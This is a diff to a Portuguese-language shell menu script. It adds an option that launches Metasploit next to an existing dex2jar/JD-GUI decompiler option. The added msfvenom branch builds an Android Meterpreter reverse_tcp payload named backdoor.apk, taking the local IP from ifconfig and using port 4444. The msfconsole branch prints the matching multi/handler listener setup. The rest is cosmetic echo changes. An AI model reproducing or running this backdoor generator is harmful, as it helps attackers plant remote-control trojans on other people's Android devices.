@@ -6,7 +6,7 @@ echo "------------           J.A.R.V.S        ------------------"
 echo ".........................................................."
 
 echo "1 --> J2dex/Jd-GUI"
-echo "2 --> ?"
+echo "2 --> MSF/msfconsole/msfvenom"
 echo "3 --> ?"
 echo "4 --> ?"
 echo "5 --> ?"
@@ -49,7 +49,7 @@ echo 'fi' >> d2j_invoke.sh
 
 echo 'java -Xms512m -Xmx1024m -classpath "${_classpath}" "$@"' >> d2j_invoke.sh
 chmod 777 d2j_invoke.sh
-echo "\n ...................................created!................... (( ok ))"
+echo "\n .................................EXTRAINDO! ................... (( ok ))"
 PRG=$1
 while [ -h "$PRG" ] ; do
   ls=`ls -ld "$PRG"`
@@ -67,8 +67,8 @@ PRGDIR=`dirname "$PRG"`
 "$PRGDIR/d2j_invoke.sh" "com.googlecode.dex2jar.tools.Dex2jarCmd" "$@"
 rm -rf d2j_invoke.sh
 echo "\n\n"
-echo "\n ...................................deleted!................... (( ok ))"
-echo "\n ........................           FINISH!          .......... (( ok ))"
+echo "\n ........................                            ..........  (<oko>)"
+echo "\n ........................           FINISH!          .......... (( [[]] ))"
 echo "\n"
 else
 echo "Obs: Mover o arquivo.dex  <para-esta-pasta>"
@@ -80,7 +80,29 @@ java -jar lib/jd-gui.jar
 fi
 
 elif [ $op -eq 2 ];then
-echo " "
+
+echo " ..................... INSTALANDO ................>>  waiting.."
+
+clear
+echo " ..................... INSTALAdO! ................>>  OK"
+sleep 3;
+echo "1 --> msfconsole"
+echo "2 --> msfvenom"
+read msf
+  if [ $msf -eq 1 ];then
+echo "..........                > ABRINDO MSFCONSOLE ...>OK!"
+echo "use exploit/multi/handler"
+echo "set payload android/meterpreter/reverse_tcp"
+echo "set LHOST <IPLocal/IPExterno>"
+echo "........................................>>>>>"
+clear
+sudo msfconsole
+elif [ $msf -eq 2 ];then
+echo "GERANDO BACKDOR PARA REDE INTERNA......"
+ip=`ifconfig | grep broadcast |  cut -c14-26`
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=4444 > $PWD/backdoor.apk
+
+fi
 elif [ $op -eq 3 ];then
 echo " "
 elif [ $op -eq 4 ];then
